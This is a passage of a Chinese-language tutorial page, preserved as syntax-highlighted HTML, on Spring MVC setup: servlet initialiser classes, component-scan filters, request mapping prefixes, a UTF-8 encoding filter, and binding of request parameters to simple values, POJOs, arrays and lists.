class="token class-name">AnnotationConfigWebApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ctx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>getServletMappings () 方法，设定 SpringMVC 对应的请求映射路径，设置为 / 表示拦截所有请求，任意请求都将转入到 SpringMVC 进行处理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>createRootApplicationContext () 方法，如果创建 Servlet 容器时需要加载非 SpringMVC 对应的 bean，使用当前方法进行，使用方式同 createServletApplicationContext ()</p></li></ul></li></ul><h1 id="4-入门案例工作流程分析"><a class="markdownIt-Anchor" href="#4-入门案例工作流程分析">#</a> 4、入门案例工作流程分析</h1><ul><li>启动服务器初始化过程<ol><li>服务器启动，执行 ServletContainersInitconfig 类，初始化 web 容器</li><li>执行 createServletApplicationContext 方法，创建了 WebApplicationContext 对象</li><li>加载 SpringMvcConfig</li><li>执行 @Componentscan 加载对应的 bean</li><li>加载 UserController，每个 @RequestMapping 的名称对应一个具体的方法</li><li>执行 getServletMappings 方法，定义所有的请求都通过 springMVC</li></ol></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220927201133944.png" alt="image-20220927201133944"></p><ul><li>单词请求过程<ol><li>发送请求 localhost/save</li><li>web 容器发现所有请求都经过 SspringMVC，将请求交给 SpringMVC 处理</li><li>解析请求路径 /save</li><li>由 /save 匹配执行对应的方法 save ()</li><li>执行 save () 检测到有 @ResponseBody 直接将 save () 方法的返回值作为响应求体返回给请求方</li></ol></li></ul><h1 id="5-controller加载控制与业务bean加载控制"><a class="markdownIt-Anchor" href="#5-controller加载控制与业务bean加载控制">#</a> 5、Controller 加载控制与业务 bean 加载控制</h1><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220927201435253.png" alt="image-20220927201435253" style="zoom: 67%;" /><ul><li>SpringMVC 相关 bean（表现层 bean）</li><li>Spring 控制的 bean<ul><li>业务的 bean（Service）</li><li>功能 bean（DataSource 等）</li></ul></li></ul><ol><li>因为功能不同，如何避免 Spring 错误的加载到 SpringMVC 的 bean—— 加载 spring 控制的 bean 的时候排除掉 SpringMVC 控制的 bean</li></ol><ul><li>SpringMVC 相关 bean 加载控制<ul><li>SpringMVC 加载的 bean 对应的包均在 com.itheima.controller 包内</li></ul></li><li>Spring 相关 bean 加载控制<ul><li>方式一: Spring 加载的 bean 设定扫描范围为 com.itheima，排除掉 controller 包内的 bean</li><li>方式二: Spring 加载的 bean 设定扫描范围为精准范围，例如 service 包、dao 包等</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//方式一：（主要用）</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">,</span><span class="token string">"com.itheima.dao"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//方式二：</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"com.itheima"</span><span class="token punctuation">,</span>excludeFilters <span class="token operator">=</span> <span class="token annotation punctuation">@ComponentScan.Filter</span><span class="token punctuation">(</span>type <span class="token operator">=</span> <span class="token class-name">FilterType</span><span class="token punctuation">.</span>ANNOTATION<span class="token punctuation">,</span>classes <span class="token operator">=</span> <span class="token class-name">Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>方式三：不区分 Spring 与 SPringMVC 的环境，加载到同一个环境中</p></li><li><p>Controller 加载控制与业务 bean 加载控制</p><ul><li><p>@ComponentScan</p></li><li><p>类型：类注释</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"com.itheima"</span><span class="token punctuation">,</span>               excludeFilters <span class="token operator">=</span> <span class="token annotation punctuation">@ComponentScan.Filter</span><span class="token punctuation">(</span>type <span class="token operator">=</span> <span class="token class-name">FilterType</span><span class="token punctuation">.</span>ANNOTATION<span class="token punctuation">,</span>classes <span class="token operator">=</span> <span class="token class-name">Controller</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>               <span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>属性：</p><ul><li>excludeFilters：排除扫描路径中加载的 bean，需要指定类别（type）与具体项（classes）</li><li>includeFilters：加载指定的 bean，需要指定类别（type）与具体项（classes）</li></ul></li></ul></li><li><p>bean 的加载格式</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createServletApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigWebApplicationContext</span> annotationConfigWebApplicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationConfigWebApplicationContext<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> annotationConfigWebApplicationContext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//这个配置方法是加载spring的配置</span>    <span class="token keyword">protected</span> <span class="token class-name">WebApplicationContext</span> <span class="token function">createRootApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigWebApplicationContext</span> annotationConfigWebApplicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationConfigWebApplicationContext<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> annotationConfigWebApplicationContext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>简易书写方法：继承 AbstractAnnotationConfigDispatcherServletInitializer 类，实现 3 个抽象方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-设置请求映射路径"><a class="markdownIt-Anchor" href="#6-设置请求映射路径">#</a> 6、设置请求映射路径</h1><ol><li><p>团队多人开发，每人设置不同的请求路径，冲突问题如何解决 —— 设置模块名作为请求路径前缀</p><ul><li><p>名称：@RequestMapping</p></li><li><p>类型：<mark>方法注解</mark> <mark>类注解</mark></p></li><li><p>位置：SpringMVC 控制器方法定义上方</p></li><li><p>作用：设置当前控制器方法请求访问路径，如果设置在类上统一设置当前控制器方法请求访问路径前缀</p></li><li><p>范例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/save"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user save'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/delete"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user delete ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'user delete'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>属性：</p><ul><li>value（默认）：请求访问路径，或访问路径前缀</li></ul></li></ul></li></ol><h1 id="7-请求方式"><a class="markdownIt-Anchor" href="#7-请求方式">#</a> 7、请求方式</h1><ul><li>get 请求</li><li>post 请求</li></ul><h2 id="71-get请求传参"><a class="markdownIt-Anchor" href="#71-get请求传参">#</a> 7.1 get 请求传参</h2><ul><li>普通参数：url 地址传参，地址参数名与变量名相同，定义形参即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004195933437.png" alt="image-20221004195933437"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParam"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 name==>"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common param'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="72-post请求传参"><a class="markdownIt-Anchor" href="#72-post请求传参">#</a> 7.2 post 请求传参</h2><ul><li>普通参数：form 表单 post 请求传参，表单参数名与形参变量名相同，定义形参即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004200126094.png" alt="image-20221004200126094"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParam"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 name==>"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common param'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="73-post中文乱码解决"><a class="markdownIt-Anchor" href="#73-post中文乱码解决">#</a> 7.3 post 中文乱码解决</h2><ul><li>过滤器：为 web 容器添加过滤器并指定字符集，Spring-web 包中提供了专用的字符集过滤器</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletContainersInitConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span><span class="token comment">/*Spring、SpringMVC、路径配置，省略......*/</span>    <span class="token comment">//乱码处理</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletFilters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">CharacterEncodingFilter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CharacterEncodingFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filter<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>filter<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="8-请求参数"><a class="markdownIt-Anchor" href="#8-请求参数">#</a> 8、请求参数</h1><h2 id="81-普通参数"><a class="markdownIt-Anchor" href="#81-普通参数">#</a> 8.1 普通参数</h2><ul><li>普通参数：url 地址传参，地址参数名与变量名相同，定义形参即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004195933437.png" alt="image-20221004195933437"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParam"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParam</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 name==>"</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common param'&#125;"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="82-名称不匹配的普通参数"><a class="markdownIt-Anchor" href="#82-名称不匹配的普通参数">#</a> 8.2 名称不匹配的普通参数</h2><ul><li>普通参数：请求参数名与形参变量名<mark>不同</mark>，使用 @RequestParam 绑定参数关系</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004195933437.png" alt="image-20221004195933437"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/commonParamDifferentName"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">commonParamDifferentName</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 userName==>"</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"普通参数传递 age==>"</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'common Param Different Name'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>参数：<ul><li>required：是否为必传参数</li><li>defaultValue：参数默认值</li></ul></li></ul><h2 id="83-实体类参数"><a class="markdownIt-Anchor" href="#83-实体类参数">#</a> 8.3 实体类参数</h2><ul><li>POJO 参数：请求参数名与形参对象<mark>属性名</mark>相同，且有 setter 方法，定义 POJO 类型形参即可接收</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004202739553.png" alt="image-20221004202739553"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoPram"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoPram</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo参数传递 user==>"</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'pojoPram'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="84-嵌套实体类参数"><a class="markdownIt-Anchor" href="#84-嵌套实体类参数">#</a> 8.4 嵌套实体类参数</h2><ul><li>嵌套 POJO 参数：请求参数名与形参对象属性名相同，按照对象层次结构关系即可接收嵌套 POJO 属性参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004202839724.png" alt="image-20221004202839724"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pojoContainPojoPram"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">pojoContainPojoPram</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pojo嵌套pojo参数传递 user==>"</span> <span class="token operator">+</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'module':'pojoContainPojoPram'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="85-数组参数"><a class="markdownIt-Anchor" href="#85-数组参数">#</a> 8.5 数组参数</h2><ul><li>数组参数：请求参数名与形参对象属性名相同且请求参数为多个，定义数组类型形参即可接收参数</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004202936395.png" alt="image-20221004202936395"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/arrayParam"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">arrayParam</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> likes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"数组参数传递 likes==>"</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>likes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token string">"&#123;'module':'arrayParam'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="86-集合保存普通参数"><a class="markdownIt-Anchor" href="#86-集合保存普通参数">#</a> 8.6 集合保存普通参数</h2><ul><li>集合保存普通参数：请求参数名与形参集合对象名相同且请求参数为多个，@RequestParam 绑定参数关系</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221004203039137.png" alt="image-20221004203039137"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/listParam"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">listParam</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> likes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合参数传递 likes==>"</span> <span class="token operator">+</span> likes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token string">"&#123;'module':'listParam'&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="87-总代码"><a class="markdownIt-Anchor" href="#87-总代码">#</a> 8.7 总代码</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token 